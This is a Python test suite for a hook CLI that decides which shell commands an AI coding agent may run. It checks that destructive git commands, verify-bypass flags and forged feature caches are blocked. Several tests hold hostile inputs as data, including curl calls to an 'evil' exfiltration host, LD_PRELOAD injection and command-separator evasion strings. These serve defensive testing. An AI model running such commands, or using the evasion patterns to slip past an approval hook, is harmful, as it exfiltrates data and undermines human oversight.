#!/usr/bin/env python3
"""Tests for unified hook CLI entrypoint."""

from __future__ import annotations

import io
import json
import os
import re
import subprocess
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest.mock import patch

from tools.hooks import cli
from tools.hooks.codex_feature import (
    codex_feature_cache_path,
    write_codex_feature_cache,
)


class HookCliTests(unittest.TestCase):
    def setUp(self) -> None:
        self._saved_hook_repo_root = os.environ.pop("METDSL_HOOK_REPO_ROOT", None)

    def tearDown(self) -> None:
        if self._saved_hook_repo_root is not None:
            os.environ["METDSL_HOOK_REPO_ROOT"] = self._saved_hook_repo_root

    @staticmethod
    def _assert_allow_output(raw_stdout: str) -> None:
        # Login shells may print noise (e.g. nvm) before the CLI output; only
        # consider lines that look like JSON objects.
        json_lines = [ln.strip() for ln in raw_stdout.splitlines() if ln.strip().startswith("{")]
        if not json_lines:
            return  # empty / non-JSON stdout → allow (CLI returns exit 0 with no output)
        body = json.loads(json_lines[-1])
        assert isinstance(body, dict)
        assert body.get("decision") == "allow"

    def test_audit_summary_preserves_codex_session_start_model(self) -> None:
        summary = cli._audit_payload_summary(
            {"model": "gpt-5.6-sol", "session_id": "thread-123"}, None)
        self.assertEqual(summary["model"], "gpt-5.6-sol")
        self.assertEqual(summary["session_id"], "thread-123")

    def test_subprocess_command_works_with_module_entrypoint(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_subprocess_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            env["METDSL_HOOK_REPO_ROOT"] = tmp
            proc = subprocess.run(
                [
                    "python3",
                    "-m",
                    "tools.hooks.cli",
                    "--backend",
                    "codex",
                    "--event",
                    "PreToolUse",
                    "--input-json",
                    json.dumps(payload),
                ],
                cwd=str(repo_root),
                env=env,
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self._assert_allow_output(proc.stdout)

    def test_subprocess_command_works_from_subdirectory(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        subdir = repo_root / "tools"
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_subprocess_002",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            cmd = (
                "ROOT=$(git rev-parse --show-toplevel); "
                "PYTHONPATH=\"$ROOT${PYTHONPATH:+:$PYTHONPATH}\" "
                f"METDSL_HOOK_REPO_ROOT=\"{tmp}\" "
                f"python3 -m tools.hooks.cli --backend codex --event PreToolUse --repo-root \"{tmp}\""
            )
            proc = subprocess.run(
                ["sh", "-lc", cmd],
                cwd=str(subdir),
                env=env,
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self._assert_allow_output(proc.stdout)

    def test_hooks_json_command_works_from_subdirectory(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        hooks_doc = json.loads((repo_root / ".codex" / "hooks.json").read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as tmp:
            command = (
                hooks_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
                .replace(
                    'METDSL_HOOK_REPO_ROOT="$ROOT"',
                    f'METDSL_HOOK_REPO_ROOT="{tmp}"',
                )
                .replace('--repo-root "$ROOT"', f'--repo-root "{tmp}"')
            )
            payload = {
                "orchestration_id": "orch_subprocess_003",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            proc = subprocess.run(
                command,
                cwd=str(repo_root / "tools"),
                env=env,
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                shell=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self._assert_allow_output(proc.stdout)

    def test_hooks_json_command_fail_fast_when_not_in_git_repo(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        hooks_doc = json.loads((repo_root / ".codex" / "hooks.json").read_text(encoding="utf-8"))
        command = hooks_doc["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_subprocess_004",
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METDSL_REQUIRE_CODEX_HOOKS_FEATURE"] = "0"
            proc = subprocess.run(
                command,
                cwd=tmp,
                env=env,
                text=True,
                capture_output=True,
                input=json.dumps(payload),
                shell=True,
                check=False,
            )
            self.assertNotEqual(proc.returncode, 0)

    def test_blocks_when_codex_hooks_feature_disabled(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (False, "hooks=false", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_disabled_002",
                    "repo_root": str(repo_root),
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 2)
                payload = json.loads(out.getvalue().strip())
                self.assertEqual(payload.get("decision"), "block")
                self.assertIn("hooks", payload.get("reason", ""))

    def test_feature_disabled_path_writes_audit_log(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (False, "hooks=false", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_disabled_001",
                    "repo_root": str(repo_root),
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 2)
                log_path = (
                    repo_root
                    / "workspace"
                    / "orchestrations"
                    / "orch_disabled_001"
                    / "hooks"
                    / "native_hook_events.jsonl"
                )
                self.assertTrue(log_path.is_file())

    def test_exception_path_writes_audit_log_when_payload_has_orchestration_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            payload = {
                "orchestration_id": "orch_exception_001",
                "repo_root": str(repo_root),
                "event_name": "NotAnEvent",
            }
            out = io.StringIO()
            with redirect_stdout(out):
                code = cli.main(
                    [
                        "--backend",
                        "codex",
                        "--input-json",
                        json.dumps(payload),
                    ]
                )
            self.assertEqual(code, 2)
            log_path = (
                repo_root
                / "workspace"
                / "orchestrations"
                / "orch_exception_001"
                / "hooks"
                / "native_hook_events.jsonl"
            )
            self.assertTrue(log_path.is_file())

    def test_blocks_dangerous_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_block_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "git reset --hard HEAD~1"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 2)
                body = json.loads(out.getvalue().strip())
                self.assertEqual(body.get("decision"), "block")

    def test_apply_patch_outside_workflow_still_applies_common_policy(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            payload = {
                "orchestration_id": "orch_apply_patch_common_policy_001",
                "repo_root": str(repo_root),
                "tool_name": "apply_patch",
                "command": "git reset --hard HEAD~1",
                "tool_input": {
                    "patch": (
                        "*** Begin Patch\n"
                        "*** Add File: workspace/pipelines/safe/out.txt\n"
                        "+x\n"
                        "*** End Patch\n"
                    )
                },
            }
            out = io.StringIO()
            with patch.dict(
                os.environ,
                {"METDSL_WORKFLOW_MODE": "0", "METDSL_REQUIRE_CODEX_HOOKS_FEATURE": "0"},
                clear=False,
            ):
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
            self.assertEqual(code, 2)
            body = json.loads(out.getvalue().strip())
            self.assertEqual(body.get("decision"), "block")
            self.assertIn("git reset --hard", body.get("reason", ""))

    def test_allows_non_dangerous_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_allow_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hello"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                self.assertEqual(out.getvalue().strip(), "")

    def test_dev_mode_blocks_verify_bypass_flags(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_dev_policy_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {
                        "command": (
                            "python3 tools/validate_pipeline_semantics.py --stage pre_judge "
                            "--allow-missing-orchestration"
                        )
                    },
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METDSL_WORKFLOW_EXEC_MODE": "dev"}):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "codex",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 2)
                body = json.loads(out.getvalue().strip())
                self.assertEqual(body.get("decision"), "block")
                self.assertIn("dev mode forbids verify bypass flags", body.get("reason", ""))

    def test_unset_workflow_mode_defaults_to_dev_and_blocks_verify_bypass_flags(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_default_dev_policy_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {
                        "command": (
                            "python3 tools/validate_pipeline_semantics.py --stage pre_judge "
                            "--allow-missing-orchestration"
                        )
                    },
                }
                out = io.StringIO()
                with patch.dict(os.environ, {}, clear=True):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "codex",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 2)
                body = json.loads(out.getvalue().strip())
                self.assertEqual(body.get("decision"), "block")
                self.assertIn("dev mode forbids verify bypass flags", body.get("reason", ""))

    def test_prod_mode_allows_same_command(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_prod_policy_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {
                        "command": (
                            "python3 tools/validate_pipeline_semantics.py --stage pre_judge "
                            "--allow-missing-orchestration"
                        )
                    },
                }
                out = io.StringIO()
                with patch.dict(os.environ, {"METDSL_WORKFLOW_EXEC_MODE": "prod"}):
                    with redirect_stdout(out):
                        code = cli.main(
                            [
                                "--backend",
                                "codex",
                                "--event",
                                "PreToolUse",
                                "--input-json",
                                json.dumps(payload),
                            ]
                        )
                self.assertEqual(code, 0)
                self.assertEqual(out.getvalue().strip(), "")

    def test_writes_native_hook_audit_log_when_orchestration_id_is_provided(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "orchestration_id": "orch_test_001",
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hello"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                log_path = (
                    repo_root
                    / "workspace"
                    / "orchestrations"
                    / "orch_test_001"
                    / "hooks"
                    / "native_hook_events.jsonl"
                )
                self.assertTrue(log_path.is_file())
                entry = json.loads(log_path.read_text(encoding="utf-8").strip())
                self.assertEqual(entry.get("backend"), "codex")
                self.assertEqual(entry.get("event"), "pre_command_execute")

    def test_missing_orchestration_id_uses_global_policy_by_default(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hello"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                self._assert_allow_output(out.getvalue())

    def test_session_start_without_orchestration_id_uses_global_log(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {"repo_root": str(repo_root)}
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "SessionStart",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                log_path = (
                    repo_root
                    / "workspace"
                    / "orchestrations"
                    / "_global"
                    / "hooks"
                    / "native_hook_events.jsonl"
                )
                self.assertFalse(log_path.exists())

    def test_missing_orchestration_id_falls_back_to_global_by_default(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            with patch("tools.hooks.cli.read_codex_feature_cache") as feature_mock:
                feature_mock.return_value = (True, "hooks=true", "ok", "2026-01-01T00:00:00Z")
                payload = {
                    "repo_root": str(repo_root),
                    "tool_name": "Bash",
                    "tool_input": {"command": "echo hello"},
                }
                out = io.StringIO()
                with redirect_stdout(out):
                    code = cli.main(
                        [
                            "--backend",
                            "codex",
                            "--event",
                            "PreToolUse",
                            "--input-json",
                            json.dumps(payload),
                        ]
                    )
                self.assertEqual(code, 0)
                log_path = (
                    repo_root
                    / "workspace"
                    / "orchestrations"
                    / "_global"
                    / "hooks"
                    / "native_hook_events.jsonl"
                )
                self.assertFalse(log_path.exists())

    @staticmethod
    def _run_codex_pre(payload: dict) -> int:
        with redirect_stdout(io.StringIO()):
            return cli.main(
                ["--backend", "codex", "--event", "PreToolUse",
                 "--input-json", json.dumps(payload)]
            )

    def test_codex_gate_reads_host_seeded_cache_without_probing(self) -> None:
        # The hook reads the host-written cache (orchestration-dir root, RO in-sandbox)
        # and never probes codex itself. A real on-disk enabled=true → allow.
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            write_codex_feature_cache(
                repo_root=repo_root, orchestration_id="orch_seed_ok",
                enabled=True, detail="hooks=true", status_kind="ok")
            payload = {
                "orchestration_id": "orch_seed_ok",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            # the probe must never be invoked by the hook
            with patch("tools.hooks.codex_feature.codex_hooks_feature_enabled",
                       side_effect=AssertionError("hook must not probe codex")):
                self.assertEqual(self._run_codex_pre(payload), 0)

    def test_codex_gate_fail_closed_on_host_seeded_disabled(self) -> None:
        # Real on-disk cache that the host wrote with enabled=false (feature off / probe
        # error) → fail closed, via the real read path (no mock).
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            write_codex_feature_cache(
                repo_root=repo_root, orchestration_id="orch_seed_off",
                enabled=False, detail="hooks=false", status_kind="ok")
            payload = {
                "orchestration_id": "orch_seed_off",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)

    def test_codex_gate_fail_closed_when_cache_missing(self) -> None:
        # No host-written cache → fail closed (the host did not certify the feature).
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_no_cache",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)

    def test_codex_gate_ignores_forged_legacy_hooks_path(self) -> None:
        # Security regression: the OLD location was the leaf-writable hooks/ dir. A leaf
        # forging enabled=true THERE must NOT be honored — the hook reads only the new
        # RO orchestration-dir-root path, which here is absent → fail closed.
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            legacy = (repo_root / "workspace" / "orchestrations" / "orch_forge"
                      / "hooks" / "codex_feature_check.json")
            legacy.parent.mkdir(parents=True, exist_ok=True)
            legacy.write_text(json.dumps(
                {"enabled": True, "detail": "hooks=true", "status_kind": "ok",
                 "checked_at": "2026-01-01T00:00:00Z"}), encoding="utf-8")
            payload = {
                "orchestration_id": "orch_forge",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)
            # the new RO path must be where the real cache lives, NOT under hooks/
            real = codex_feature_cache_path(repo_root=repo_root, orchestration_id="orch_forge")
            self.assertNotIn("/hooks/", str(real))
            self.assertFalse(real.is_file())

    def test_codex_gate_fail_closed_on_malformed_cache(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            repo_root = Path(tmp)
            path = codex_feature_cache_path(repo_root=repo_root, orchestration_id="orch_bad")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps({"enabled": "yes-please"}), encoding="utf-8")
            payload = {
                "orchestration_id": "orch_bad",
                "repo_root": str(repo_root),
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            self.assertEqual(self._run_codex_pre(payload), 2)


class ClaudeHookCliTests(unittest.TestCase):
    def setUp(self) -> None:
        self._saved_hook_repo_root = os.environ.pop("METDSL_HOOK_REPO_ROOT", None)

    def tearDown(self) -> None:
        if self._saved_hook_repo_root is not None:
            os.environ["METDSL_HOOK_REPO_ROOT"] = self._saved_hook_repo_root

    def test_claude_backend_allows_safe_command(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_claude_allow_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "echo hello"},
            }
            env = os.environ.copy()
            env["METDSL_HOOK_REPO_ROOT"] = tmp
            proc = subprocess.run(
                [
                    "python3",
                    "-m",
                    "tools.hooks.cli",
                    "--backend",
                    "claude",
                    "--event",
                    "PreToolUse",
                    "--input-json",
                    json.dumps(payload),
                ],
                cwd=str(repo_root),
                env=env,
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 0)
            self.assertEqual(proc.stdout.strip(), "")

    def test_claude_backend_blocks_git_reset_hard(self) -> None:
        repo_root = Path(__file__).resolve().parents[2]
        with tempfile.TemporaryDirectory() as tmp:
            payload = {
                "orchestration_id": "orch_claude_block_001",
                "repo_root": tmp,
                "tool_name": "Bash",
                "tool_input": {"command": "git reset --hard HEAD~1"},
            }
            env = os.environ.copy()
            env["METDSL_HOOK_REPO_ROOT"] = tmp
            proc = subprocess.run(
                [
                    "python3",
                    "-m",
                    "tools.hooks.cli",
                    "--backend",
                    "claude",
                    "--event",
                    "PreToolUse",
                    "--input-json",
                    json.dumps(payload),
                ],
                cwd=str(repo_root),
                env=env,
                text=True,
                capture_output=True,
                check=False,
            )
            self.assertEqual(proc.returncode, 2)
            body = json.loads(proc.stdout.strip())
            self.assertEqual(body.get("decision"), "block")

    def test_detect_bash_write_targets_collects_all_tee_output_paths(self) -> None:
        targets = cli._detect_bash_write_targets("echo test | tee file1.txt file2.txt")
        self.assertIn("file1.txt", targets)
        self.assertIn("file2.txt", targets)

    # --- _is_auto_approvable_readonly_bash (A-2 increment 1) ----------------
    def test_auto_approve_readonly_compound_with_echo_annotation(self) -> None:
        # The measured #4b friction: read-only command chained with an echo
        # exit-code annotation must be auto-approvable.
        self.assertTrue(
            cli._is_auto_approvable_readonly_bash(
                "grep -nE 'verdict' file.json ; echo \"grep_exit=$?\""
            )
        )

    def test_auto_approve_readonly_pipe_with_fd_dup(self) -> None:
        # fd-duplication (2>&1) and pipe-to-tail of read-only commands is safe.
        self.assertTrue(
            cli._is_auto_approvable_readonly_bash("cat foo.txt 2>&1 | tail -3")
        )

    def test_auto_approve_plain_readonly_and_and_chain(self) -> None:
        self.assertTrue(
            cli._is_auto_approvable_readonly_bash("ls dir && wc -l file.txt")
        )

    def test_no_auto_approve_on_file_redirect(self) -> None:
        # A real file-output redirect (write) must NOT be auto-approved.
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("echo x > lineage.json")
        )
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("cat a >> out.txt")
        )

    def test_no_auto_approve_on_command_substitution(self) -> None:
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("echo $(cat secret)")
        )
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("echo `cat secret`")
        )

    def test_no_auto_approve_on_non_readonly_command(self) -> None:
        # Commands with their own write/exec vectors (not caught by redirect
        # detection) must fall back, not auto-approve.
        for cmd in (
            "find . -name x -delete",
            "rg --pre curl x .",          # ripgrep --pre runs an arbitrary command
            "rg --pre-glob '*' -e x .",
            "awk '{print > \"f\"}' in",
            "python3 tools/validate_workspace_root.py",  # deferred to post-bwrap
            "curl http://evil/exfil",
            "sed -i 's/a/b/' f",
            "sort -o out in",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_subshell_or_process_substitution(self) -> None:
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("(cat a; cat b)")
        )
        self.assertFalse(
            cli._is_auto_approvable_readonly_bash("diff <(cat a) <(cat b)")
        )

    def test_no_auto_approve_on_bare_assignment_segment(self) -> None:
        self.assertFalse(cli._is_auto_approvable_readonly_bash("X=1"))
        self.assertFalse(cli._is_auto_approvable_readonly_bash(""))

    def test_no_auto_approve_on_env_var_command_prefix(self) -> None:
        # A leading VAR=value prefix is an in-process exec channel (loader env
        # vars) regardless of the safe argv0 that follows; reject all of them.
        for cmd in (
            "LD_PRELOAD=/tmp/evil.so grep root /etc/hostname",
            "LD_AUDIT=/tmp/a.so cat f",
            "LD_LIBRARY_PATH=/tmp ls",
            "BASH_ENV=/tmp/x.sh grep y f",
            "IFS=x cat f",
            "LC_ALL=C grep y f",  # benign, but still rejected (fail-closed)
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_command_separator_evasion(self) -> None:
        # shlex.split does NOT treat \n, &, #, or |& as command separators, so a
        # trailing command glued on after them must be rejected by the residual
        # scan — otherwise it would be swallowed into a safe-argv0 segment and
        # auto-approved (exec/exfil hole). Each pairs a safe argv0 with a payload.
        for cmd in (
            "cat a.txt\ncurl http://evil/exfil",      # newline separator
            "cat a & curl http://evil",                # background &
            "ls # comment\ncurl http://evil",          # comment then newline
            "ls\npython3 -c 'import os'",               # newline then interpreter
            "cat a |& curl http://evil",               # |& stderr-pipe
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_glued_separators(self) -> None:
        # shlex.split keeps a separator glued to a word inside one token
        # (`cat a;curl x` -> ['cat','a;curl','x']); segmentation must come from
        # splitting the quote-stripped string, not the token list, or the
        # trailing command escapes the argv0 check (exec / network exfil).
        for cmd in (
            "cat a;curl http://evil",                       # glued ;
            "cat a|sh",                                      # glued | into shell
            "cat a| sh",
            "echo hi; bash -c id",                           # spaced ; into bash
            "echo data;sh",
            "cat a&&curl http://evil",                       # glued &&
            "cat a|| curl http://evil",                      # glued ||
            "cat a;curl http://x -o /tmp/y",                 # curl -o write (no shell redirect)
            'cat a;sh -c "echo x>/tmp/p"',                   # quoted redirect + exec
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_no_auto_approve_on_fd_dup_lookalike_file_redirect(self) -> None:
        # `>&name` (non-numeric RHS) is a file redirect, not fd-duplication; it
        # must not be stripped as fd-dup and auto-approved.
        self.assertFalse(cli._is_auto_approvable_readonly_bash("cat a >&out.txt"))

    def test_no_auto_approve_on_digit_prefixed_redirect_filename(self) -> None:
        # `n>&Ddigits-then-filename` (e.g. 1>&9secret) is a FILE redirect in bash;
        # the fd-dup strip must not eat the `1>&9` prefix and leave `secret` inert.
        for cmd in (
            "cat /etc/hostname 1>&9secret",
            "ls 2>&1foo",
            "ls 0>&1bar",
            "cat a 2>&3baz",
        ):
            with self.subTest(cmd=cmd):
                self.assertFalse(cli._is_auto_approvable_readonly_bash(cmd))

    def test_auto_approve_still_allows_multidigit_fd_dup(self) -> None:
        # Genuine fd-duplication with all-digit RHS still strips and passes.
        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a 1>&12"))
        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a 2>&1 | head"))

    def test_auto_approve_still_allows_real_fd_dup(self) -> None:
        # Regression guard for the tightened _FD_DUP_RE / control-op blanking:
        # genuine fd-duplication and the allowed control operators still pass.
        self.assertTrue(cli._is_auto_approvable_readonly_bash("cat a >&2"))
        self.assertTrue(cli._is_auto_approvable_readonly_bash("ls a && ls b || ls c"))

    def test_detect_bash_write_targets_detects_sed_inplace_without_space_after_i(self) -> None:
        targets = cli._detect_bash_write_targets("sed -i's/a/b/' file.txt")
        self.assertIn("file.txt", targets)

    def test_detect_bash_write_targets_detects_sed_inplace_when_i_comes_after_script(self) -> None:
        targets = cli._detect_bash_write_targets("sed -e 's/a/b/' -i file.txt")
        self.assertIn("file.txt", targets)

    def test_detect_bash_write_targets_ignores_redirect_inside_double_quoted_arg(self) -> None:
        # --reply-text "... > 0 ..." must NOT be treated as a redirect to "0"
        cmd = 'python3 tools/orchestration_runtime.py record-reply --reply-text "verification_status=fail. exit code > 0"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_ignores_redirect_inside_single_quoted_arg(self) -> None:
        cmd = "python3 tools/orchestration_runtime.py record-reply --reply-text 'status > 0, see log'"
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_still_detects_real_redirect_outside_quotes(self) -> None:
        cmd = 'python3 foo.py --arg "inner > ignored" > workspace/out.txt'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/out.txt", targets)
        self.assertNotIn("ignored", targets)

    def test_detect_bash_write_targets_ignores_tee_inside_quoted_arg(self) -> None:
        cmd = 'python3 foo.py --reply-text "pipe | tee tmpfile"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertEqual(targets, [])

    def test_detect_bash_write_targets_tee_with_quoted_path_detects_target(self) -> None:
        # tee outside quotes but its path argument is quoted: must detect the real path, not whitespace
        cmd = 'python3 foo.py 2>&1 | tee "output.log"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("output.log", targets)
        self.assertFalse(any(not t.strip() for t in targets))

    def test_detect_bash_write_targets_redirect_inside_command_substitution_in_quoted_arg(self) -> None:
        # "$(echo hi > workspace/forbidden.txt)" — $() executes even inside double quotes
        cmd = 'python3 foo.py --arg "$(echo hi > workspace/forbidden.txt)"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/forbidden.txt", targets)

    def test_detect_bash_write_targets_backtick_substitution_inside_quoted_arg(self) -> None:
        cmd = 'python3 foo.py --arg "`echo hi > workspace/out.txt`"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("workspace/out.txt", targets)

    def test_detect_bash_write_targets_nested_command_substitution(self) -> None:
        # Nested $(): both inner and outer redirects should be caught
        cmd = 'python3 foo.py "$(echo $(ls > /tmp/a) > /tmp/b)"'
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/a", targets)
        self.assertIn("/tmp/b", targets)

    def test_detect_bash_write_targets_single_quoted_paren_inside_subshell(self) -> None:
        # '(' inside $() must not inflate depth and cause the body to be dropped
        cmd = """python3 foo.py --arg "$(printf '('; echo hi > /tmp/pwn)" """
        targets = cli._detect_bash_write_targets(cmd)
        self.assertIn("/tmp/pwn", targets)

